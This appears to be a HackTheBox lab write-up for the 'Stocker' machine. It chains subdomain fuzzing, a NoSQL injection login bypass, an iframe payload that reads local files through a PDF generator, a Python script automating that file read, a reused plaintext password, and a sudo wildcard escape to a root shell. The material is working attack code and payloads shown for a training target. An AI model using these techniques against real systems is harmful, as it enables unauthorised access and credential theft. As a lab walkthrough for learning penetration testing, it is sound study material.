---
layout: single
title: Stocker hackthebox writeup
excerpt: "Easy linux machine in which we find a subdomain, bypass a login, get LFI thanks to XSS and escalate privileges via missconfiguration"
date: 2023-01-17
classes: wide
header:
  teaser: /assets/images/stocker/stocker_icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - writeup
tags:
  - hackthebox
  - fuzzing
  - NoSQL injection
  - XSS
  - LFI
  - sudo
---

![](/assets/images/stocker/stocker.png)

## User Flag

The usual port scan gives us the usual information

```shell
$ nmap -sS -n -Pn --min-rate 5000 -p- -vv -oN allports 10.129.134.26
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Nevertheless, it's essential to do an in-depth port scan.

```shell
$ nmap -sCV -vv -p22,80 -oN targeted 10.129.134.26
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
...
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port number 80 is redirecting us to stocker.htb so let's just add that to `/etc/hosts`. The website is just a normal static site. However, The *we're still actively developing* sentence makes me think there may be some virtual host thus I started fuzzing.


```shell
$ ffuf -w ~/wordlist/subdomains-UPDATED.txt -u http://stocker.htb -fs 178 -H 'Host: FUZZ.stocker.htb' -v


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://stocker.htb
 :: Wordlist         : FUZZ: /home/dasor/wordlist/subdomains-UPDATED.txt
 :: Header           : Host: FUZZ.stocker.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 178
________________________________________________

[Status: 302, Size: 28, Words: 4, Lines: 1]
| URL | http://stocker.htb
| --> | /login
    * FUZZ: dev
```

It seems my intuition was correct! let's add this to `/etc/hosts`. Ok, now we have a login page thus is time to bypass it. Neither SQL injection nor LDAP injection worked so I tried NoSQL injection. Taking a look at Hacktricks payloads I found [this one](https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass) worked. Just intercept the request with burpsuite, change the `Content-Type` to `application/json` and bypass the login.

Now we are against a shop that generates a pdf of our order. Again if you intercept the request with burpsuite you can see how JSON is being sent, this seems like a great attack vector. We have the ability to change the value of the parameters as we please, so I tested a basic HTML injection like `<h1>Test</h1>` and fairly enough it worked. Now we may be able to get LFI thanks to the XSS. By using a payload like this `<iframe width=800 height=800 src=file:///etc/passwd></iframe>` we get local file inclusion. The width and height parameters are important so the file can be seen completely. We can see the only user is called **angoose**

At this point, I tried to expose the source code of the website by creating a python script to automate the LFI process and also creating a small wordlist.


```python
#!/usr/bin/python3

import requests
import sys
import urllib.parse


def send_data(wordlist):
    # convert to list
    url = 'http://dev.stocker.htb/login'
    ## send json data to the server
    data = {"username": {"$ne": "toto"}, "password": {"$ne": "too" }}
    r = requests.post(url, json=data, allow_redirects=False)
    cookie = r.headers['Set-Cookie']
    cookie = cookie[:cookie.find(';')]
    f = open(wordlist, 'r')
    for line in f:
        url = "http://dev.stocker.htb/api/order"
        line = line[:-1]
        lfi = "<iframe width=800 height=800 src=file:///" + line
        lfi = lfi + "></iframe>"
        data = {"basket":[{"_id":"638f116eeb060210cbd83a8d","title":lfi,"image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
        r = requests.post(url, json=data, headers={'Cookie': cookie})
        pdf_id = r.text[r.text.find('6') : r.text.rfind('"')]
        url = "http://dev.stocker.htb/api/po/" + pdf_id
        r = requests.get(url, headers={'Cookie': cookie})
        if len(r.text) != 35267:
            print("[+] file: " + line)
            print("          id:" + pdf_id)

if __name__ == '__main__':
    send_data(sys.argv[1])
```

and the wordlist

```shell
/var/www/html/index.html
/var/www/html/index.js
/var/www/html/dev/index.js
/var/www/html/dev/index.html
/var/www/dev/index.html
/var/www/dev/index.js
```

Then I ran the script

```shell
$ ./stocker.py custom_wordlist
[+] file: /var/www/html/index.html
          id:63c6b10fa675cbb8a7a15007
[+] file: /var/www/dev/index.js
          id:63c6b117a675cbb8a7a15020
```

In the second file, we can find a string with credentials

```
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
```

If we try to log in via ssh

```shell
$ ssh angoose@stocker.htb
angoose@stocker.htb's password:

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

angoose@stocker:~$
```

Great we have the user flag!

## Root flag

The first thing I always do to privesc is check `sudo -l` and this time it has some interesting information.


```shell
angoose@stocker:~$ sudo -l
[sudo] password for angoose:
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js

```

Now I have to admit, I got stuck a little here, but by just thinking about it for a bit I came up with the solution. It is actually very simple, if you think a bit out of the box and remember the strict meaning of the wildcard `*` then it's done. Basically, that line does not mean that you can only execute the javascript files inside `/usr/local/scripts` , it means you can execute every javascript file on the system. This is because the wildcard can be everything including `../`.

Then I just created a `.js` file with these contents and got root.

```shell
angoose@stocker:~$ cat privesc.js
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
angoose@stocker:~$ sudo node /usr/local/scripts/../../../../home/angoose/privesc.js
# whoami
root
#
```

That is all, thanks for reading!
